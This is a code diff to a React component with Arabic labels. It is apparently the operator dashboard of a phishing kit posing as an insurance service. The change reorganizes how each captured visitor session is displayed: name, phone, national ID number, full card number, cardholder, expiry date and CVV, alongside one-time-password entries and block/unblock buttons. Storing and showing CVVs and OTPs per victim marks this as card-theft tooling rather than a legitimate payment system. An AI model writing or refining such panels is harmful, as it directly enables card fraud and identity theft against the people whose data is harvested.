@@ -134,7 +134,6 @@ function SessionBox({
   onOpenHistory: () => void;
 }) {
   const [expanded, setExpanded] = useState(true);
-  const [showOldCards, setShowOldCards] = useState(false);
   const [loadingAction, setLoadingAction] = useState<string | null>(null);
 
   const initialRow = rows.find((row) => row.type === "initial");
@@ -143,10 +142,8 @@ function SessionBox({
   const phone = initialData.phone || "بدون هاتف";
   const cardRows = rows.filter((row) => row.type === "card");
   const latestCard = cardRows[cardRows.length - 1];
-  const oldCards = cardRows.slice(0, -1);
   const cardData = parseData(latestCard?.data ?? null);
   const otpRows = rows.filter((row) => row.type.startsWith("otp"));
-  const atmRows = rows.filter((row) => row.type === "atm");
   const lastActivity = rows[rows.length - 1]?.createdAt ?? rows[0]?.createdAt;
 
   const statusBadge = blocked
@@ -208,11 +205,6 @@ function SessionBox({
           <div className="flex flex-wrap gap-2 self-end">
             <button
               type="button"
-              onClick={onOpenHistory}
-              className="rounded-2xl border border-slate-200 bg-slate-50 px-3 py-2 text-xs text-slate-700 hover:bg-slate-100"
-            >سجل كامل</button>
-            <button
-              type="button"
               onClick={blocked ? onUnblock : onBlock}
               className={`rounded-2xl px-3 py-2 text-xs font-semibold ${blocked ? "border border-green-200 bg-green-50 text-green-700 hover:bg-green-100" : "border border-slate-200 bg-slate-50 text-slate-700 hover:bg-slate-100"}`}
             >{blocked ? "رفع الحظر" : "حظر"}</button>
@@ -226,57 +218,40 @@ function SessionBox({
 
         {expanded && (
           <div className="mt-4 space-y-4 border-t border-slate-100 pt-4">
-            {latestCard ? (
-              <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
-                <div className="flex flex-col gap-3 sm:flex-row sm:items-center sm:justify-between">
-                  <div>
-                    <p className="text-xs font-semibold text-slate-500">أحدث بطاقة</p>
-                    <p className="mt-2 text-lg font-bold text-slate-900 font-mono" dir="ltr">{formattedCard}</p>
-                  </div>
-                  <span className="text-xs text-slate-500" dir="ltr">{formatAgo(latestCard.createdAt)}</span>
+            {/* صندوق البيانات المركبة */}
+            <div className="rounded-3xl border border-slate-200 bg-slate-50 p-4">
+              <p className="text-xs font-semibold text-slate-500 mb-3">البيانات المركبة</p>
+              
+              {/* البيانات الشخصية */}
+              <div className="mb-4">
+                <p className="text-[10px] text-slate-400 mb-2">البيانات الشخصية</p>
+                <div className="grid gap-2 sm:grid-cols-2 text-xs">
+                  <div className="rounded-xl bg-white p-2">الاسم: <span className="font-semibold">{name}</span></div>
+                  <div className="rounded-xl bg-white p-2">الهاتف: <span className="font-semibold" dir="ltr">{phone}</span></div>
+                  <div className="rounded-xl bg-white p-2">رقم الهوية: <span className="font-semibold" dir="ltr">{initialData.idNumber ?? "—"}</span></div>
+                  <div className="rounded-xl bg-white p-2">نوع التامين: <span className="font-semibold">{initialData.insuranceType ?? "—"}</span></div>
                 </div>
-                <div className="mt-4 grid gap-3 sm:grid-cols-2 text-xs text-slate-600">
-                  <div>المالك: {cardData.cardHolder ?? "—"}</div>
-                  <div>انتهاء: {cardData.expiry ?? "—"}</div>
-                  <div>CVV: {cardData.cvv ?? "—"}</div>
-                  <div>الهوية: {initialData.idNumber ?? "—"}</div>
-                </div>
-                {oldCards.length > 0 && (
-                  <div className="mt-4">
-                    <button
-                      type="button"
-                      onClick={() => setShowOldCards((value) => !value)}
-                      className="text-xs text-blue-600 hover:underline"
-                    >{showOldCards ? "إخفاء" : "عرض"} البطاقات السابقة ({oldCards.length})</button>
-                    {showOldCards && (
-                      <div className="mt-3 space-y-3">
-                        {oldCards.map((card) => {
-                          const data = parseData(card.data);
-                          return (
-                            <div key={card.id} className="rounded-3xl border border-red-100 bg-red-50 p-3 text-xs">
-                              <div className="flex items-center justify-between text-slate-500 mb-2">
-                                <span>سجل سابق</span>
-                                <span dir="ltr">{formatAgo(card.createdAt)}</span>
-                              </div>
-                              <div className="font-mono font-semibold text-red-700" dir="ltr">{(data.cardNumber ?? "—").toString().replace(/(.{4})/g, "$1 ").trim()}</div>
-                              <div className="mt-2 flex flex-wrap gap-2 text-slate-500 text-[11px]">
-                                <span>{data.cardHolder ?? "—"}</span>
-                                <span>{data.expiry ?? "—"}</span>
-                                <span>{data.cvv ? `CVV ${data.cvv}` : "—"}</span>
-                              </div>
-                            </div>
-                          );
-                        })}
-                      </div>
-                    )}
+              </div>
+
+              {/* بيانات البطاقة */}
+              {latestCard ? (
+                <div>
+                  <p className="text-[10px] text-slate-400 mb-2">بيانات البطاقة</p>
+                  <div className="grid gap-2 sm:grid-cols-2 text-xs">
+                    <div className="rounded-xl bg-white p-2 sm:col-span-2">
+                      رقم البطاقة: <span className="font-mono font-semibold" dir="ltr">{formattedCard}</span>
+                    </div>
+                    <div className="rounded-xl bg-white p-2">المالك: <span className="font-semibold">{cardData.cardHolder ?? "—"}</span></div>
+                    <div className="rounded-xl bg-white p-2">تاريخ الانتهاء: <span className="font-semibold" dir="ltr">{cardData.expiry ?? "—"}</span></div>
+                    <div className="rounded-xl bg-white p-2">CVV: <span className="font-semibold" dir="ltr">{cardData.cvv ?? "—"}</span></div>
                   </div>
-                )}
-              </div>
-            ) : (
-              <div className="rounded-3xl border border-dashed border-slate-300 bg-slate-50 p-4 text-xs text-slate-500">
-                لا توجد بطاقة حتى الآن — الجلسة جاهزة لإدخال النتائج.
-              </div>
-            )}
+                </div>
+              ) : (
+                <div className="rounded-3xl border border-dashed border-slate-300 bg-white p-3 text-xs text-slate-500 text-center">
+                  لا توجد بطاقة حتى الآن
+                </div>
+              )}
+            </div>
 
             {otpRows.length > 0 && (
               <div className="rounded-3xl border border-slate-200 bg-white p-4">
